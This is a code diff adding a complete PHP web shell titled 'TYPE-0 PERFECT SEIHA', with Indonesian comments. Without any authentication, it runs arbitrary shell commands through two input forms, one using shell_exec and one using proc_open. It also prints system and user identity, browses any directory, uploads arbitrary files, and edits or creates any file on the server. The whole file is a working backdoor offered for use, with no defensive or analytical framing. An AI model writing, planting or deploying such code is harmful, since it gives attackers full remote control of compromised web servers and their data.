@@ -1,0 +1,261 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>TYPE-0 PERFECT SEIHA</title>
+    <style>
+        @import url('https://fonts.googleapis.com/css?family=Dosis');
+        @import url('https://fonts.googleapis.com/css?family=Bungee');
+        @import url('https://fonts.googleapis.com/css?family=Russo+One');
+        body {
+            font-family: "Russo One", cursive;
+            text-shadow: 0px 0px 1px #757575;
+        }
+        .container { max-width: 800px; margin: 20px auto; padding: 20px; border: 1px solid #ccc; }
+        table { width: 100%; border-collapse: collapse; }
+        th, td { border: 1px solid #ddd; padding: 8px; text-align: left; }
+        th { background-color: #f2f2f2; }
+        .breadcrumb { list-style-type: none; padding: 0; display: flex; flex-wrap: wrap; justify-content: center; }
+        .breadcrumb li { margin-right: 5px; }
+        .breadcrumb a { text-decoration: none; color: blue; }
+        .permission-green { color: green; }
+        .permission-red { color: red; }
+        .current-directory h3 {
+            text-align: center;
+        }
+        .home-link { font-size: 18px; margin-bottom: 10px; }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h2>TYPE-0 PERFECT SEIHA</h2>
+        <?php
+        echo '<h3>Server Info:</h3>';
+        echo '<pre>' . shell_exec('uname -a') . '</pre>';
+        echo '<h3>User Info:</h3>';
+        echo '<pre>' . shell_exec('id') . '</pre>';
+        echo '<h3>Server Software:</h3>';
+        if (strpos($_SERVER['SERVER_SOFTWARE'], 'LiteSpeed') !== false) {
+            echo '<pre>LiteSpeed</pre>';
+        } elseif (strpos($_SERVER['SERVER_SOFTWARE'], 'Apache') !== false) {
+            echo '<pre>Apache</pre>';
+        } else {
+            echo '<pre>' . $_SERVER['SERVER_SOFTWARE'] . '</pre>';
+        }
+        function listFiles($dir) {
+    $folders = array();
+    $files = array();
+    if (is_dir($dir)) {
+        if ($dh = opendir($dir)) {
+            while (($file = readdir($dh)) !== false) {
+                if ($file != '.' && $file != '..') {
+                    $filePath = $dir . '/' . $file;
+                    $fileInfo = stat($filePath);
+                    $permissions = substr(sprintf('%o', fileperms($filePath)), -4);
+                    $lastModified = date('Y-m-d H:i:s', $fileInfo['mtime']);
+                    
+                    // Cek apakah posix tersedia
+                    if (function_exists('posix_getpwuid') && function_exists('posix_getgrgid')) {
+					$pwuid = @posix_getpwuid($fileInfo['uid']);
+					$grgid = @posix_getgrgid($fileInfo['gid']);
+					$userGroup = $pwuid['name'] . '/' . $grgid['name'];
+					} else {
+					$userGroup = 'Unknown/Unknown'; // Fallback untuk Windows
+					}
+
+                    $size = is_dir($filePath) ? '-' : filesize($filePath);
+                    $permissionClass = is_writable($filePath) ? 'permission-green' : 'permission-red';
+
+                    $fileData = array(
+                        'name' => $file,
+                        'size' => $size,
+                        'permissions' => $permissions,
+                        'lastModified' => $lastModified,
+                        'userGroup' => $userGroup,
+                        'path' => $filePath,
+                        'isDir' => is_dir($filePath),
+                        'permissionClass' => $permissionClass
+                    );
+                    if ($fileData['isDir']) {
+                        $folders[] = $fileData;
+                    } else {
+                        $files[] = $fileData;
+                    }
+                }
+            }
+            closedir($dh);
+        }
+    } else {
+        echo '<p>Not a valid directory.</p>';
+    }
+    echo '<h3>Folders:</h3>';
+    echo '<table>';
+    echo '<tr><th>Name</th><th>Size</th><th>Permissions</th><th>Last Modified</th><th>User/Group</th></tr>';
+    foreach ($folders as $folder) {
+        echo '<tr>';
+        echo '<td><a href="?dir='.urlencode($folder['path']).'"> '.$folder['name'].'</a></td>';
+        echo '<td>'.$folder['size'].'</td>';
+        echo '<td class="'.$folder['permissionClass'].'">'.$folder['permissions'].'</td>';
+        echo '<td>'.$folder['lastModified'].'</td>';
+        echo '<td>'.$folder['userGroup'].'</td>';
+        echo '</tr>';
+    }
+    echo '</table>';
+    echo '<h3>Files:</h3>';
+    echo '<table>';
+    echo '<tr><th>Name</th><th>Size</th><th>Permissions</th><th>Last Modified</th><th>User/Group</th></tr>';
+    foreach ($files as $file) {
+        echo '<tr>';
+        echo '<td><a href="?dir='.urlencode($dir).'&edit='.urlencode($file['path']).'"> '.$file['name'].'</a></td>';
+        echo '<td>'.$file['size'].'</td>';
+        echo '<td class="'.$file['permissionClass'].'">'.$file['permissions'].'</td>';
+        echo '<td>'.$file['lastModified'].'</td>';
+        echo '<td>'.$file['userGroup'].'</td>';
+        echo '</tr>';
+    }
+    echo '</table>';
+}
+
+        $currentDir = isset($_GET['dir']) ? $_GET['dir'] : getcwd();
+        if (isset($_GET['dir']) && is_dir($_GET['dir'])) {
+            $currentDir = realpath($_GET['dir']);
+        }
+        chdir($currentDir);
+        // Aploder
+        if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_FILES['files'])) {
+            $uploadDir = $currentDir . '/';
+            // Loop untuk menangani beberapa file
+            foreach ($_FILES['files']['name'] as $key => $name) {
+                $uploadFile = $uploadDir . basename($name);
+                if (move_uploaded_file($_FILES['files']['tmp_name'][$key], $uploadFile)) {
+                    echo '<p>File ' . htmlspecialchars($name) . ' uploaded successfully.</p>';
+                } else {
+                    echo '<p>Failed to upload file ' . htmlspecialchars($name) . '.</p>';
+                }
+            }
+        }
+        // Komeng
+        if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['komeng'])) {
+            $komeng = $_POST['komeng'];
+            if ($komeng) {
+                echo '<h3>Komeng Output:</h3>';
+                echo '<pre>';
+                echo shell_exec(escapeshellcmd($komeng));
+                echo '</pre>';
+            }
+        }
+        // Edit
+        if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['save'])) {
+            $fileToSave = $_POST['filename'];
+            $content = $_POST['content'];
+            file_put_contents($fileToSave, $content);
+            // Tetap berada di halaman edit setelah menyimpan
+            $dir = dirname($fileToSave);
+            header("Location: ?dir=" . urlencode($dir) . "&edit=" . urlencode($fileToSave));
+            exit;
+        }
+        // Krit dir
+        if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['new_dir'])) {
+            $newDir = $_POST['new_dir'];
+            if ($newDir) {
+                $newDirPath = $currentDir . '/' . $newDir;
+                if (!is_dir($newDirPath)) {
+                    mkdir($newDirPath);
+                    echo '<p>Directory created successfully.</p>';
+                } else {
+                    echo '<p>Directory already exists.</p>';
+                }
+            }
+        }
+        // Krit file
+        if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['new_file'])) {
+            $newFile = $_POST['new_file'];
+            if ($newFile) {
+                $newFilePath = $currentDir . '/' . $newFile;
+                if (!file_exists($newFilePath)) {
+                    file_put_contents($newFilePath, '');
+                    echo '<p>File created successfully.</p>';
+                } else {
+                    echo '<p>File already exists.</p>';
+                }
+            }
+        }
+		// Current Direktori
+        function renderBreadcrumb($currentDir) {
+            $pathArray = explode(DIRECTORY_SEPARATOR, $currentDir);
+            echo '<ul class="breadcrumb" style="justify-content:center;">';
+            echo '<li><a href="?">[HOME]</a></li>';
+            foreach ($pathArray as $index => $dir) {
+                if ($dir === '') continue;  
+                $path = implode(DIRECTORY_SEPARATOR, array_slice($pathArray, 0, $index + 1));
+                echo '<li><a href="?dir=' . urlencode($path) . '">' . htmlspecialchars($dir) . '</a></li>';
+                if ($index < count($pathArray) - 1) {
+                    echo '<li>/</li>';
+                }
+            }
+            echo '</ul>';
+        }
+        ?>
+        <form method="POST" enctype="multipart/form-data">
+            <input type="file" name="files[]" multiple>
+            <button type="submit">Upload Files</button>
+        </form>
+
+        <form method="POST">
+		<label for="komeng" class="lime-text">Komeng:</label>
+            <input type="text" name="komeng" placeholder="Enter Komeng">
+            <button type="submit">Execute Komeng</button>
+        </form>
+		
+		<?php //  PROC OPEN :V
+		if ($_SERVER["REQUEST_METHOD"] === "POST") {
+			$komeng = escapeshellcmd($_POST['komeng']);
+			$descriptorspec = array(
+				0 => array("pipe", "r"),  // stdin
+				1 => array("pipe", "w"),  // stdout
+				2 => array("pipe", "w")   // stderr
+			);
+			$process = proc_open($komeng, $descriptorspec, $pipes);
+			if (is_resource($process)) {
+			$output = stream_get_contents($pipes[1]);
+			fclose($pipes[1]);
+			proc_close($process);
+			}
+			}
+		?>
+		<form method="post">
+			<label for="komeng" class="lime-text">PROC:</label>
+			<input type="text" name="komeng" id="komeng" required>
+			<button type="submit">Run PROC</button>
+		</form>
+		<pre class="lime-text"><?php if (isset($output)) { echo htmlspecialchars($output); } ?></pre>
+		
+        <form method="POST">
+            <input type="text" name="new_file" placeholder="New file name">
+            <button type="submit">Create File</button>
+        </form>
+
+        <form method="POST">
+            <input type="text" name="new_dir" placeholder="New directory name">
+            <button type="submit">Create Directory</button>
+        </form>
+        <?php
+        renderBreadcrumb($currentDir);
+        if (isset($_GET['edit'])) {
+            $fileToEdit = $_GET['edit'];
+            if (is_file($fileToEdit)) {
+                $content = file_get_contents($fileToEdit);
+                echo '<h3>Edit File: ' . htmlspecialchars($fileToEdit) . '</h3>';
+                echo '<form method="POST">';
+                echo '<textarea name="content" rows="20" cols="105">' . htmlspecialchars($content) . '</textarea><br>';
+                echo '<input type="hidden" name="filename" value="' . htmlspecialchars($fileToEdit) . '">';
+                echo '<button type="submit" name="save">Save</button>';
+                echo '</form>';
+            }
+        }
+        ?>
+        <?php listFiles($currentDir); ?>
+    </div>
+</body>
+</html>
